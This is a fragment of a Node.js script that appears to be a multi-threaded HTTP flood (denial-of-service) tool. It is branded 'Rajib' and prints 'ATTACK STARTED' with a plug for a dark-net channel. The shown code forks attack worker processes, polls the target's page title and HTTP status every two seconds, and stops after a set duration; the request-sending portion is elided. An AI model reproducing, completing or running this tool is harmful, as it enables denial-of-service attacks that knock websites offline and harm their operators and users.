 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`[\x1b[35mRajib\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[35mRajib\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[35mRajib\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[35mRajib\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}
...
if (cluster.isMaster){
  console.clear();
  console.log(`
ATTACK STARTED - JOIN -->@BD_DARK_NET - :)
`);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[\x1b[35mRajib\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[\x1b[35mRajib\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[\x1b[35mRajib\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
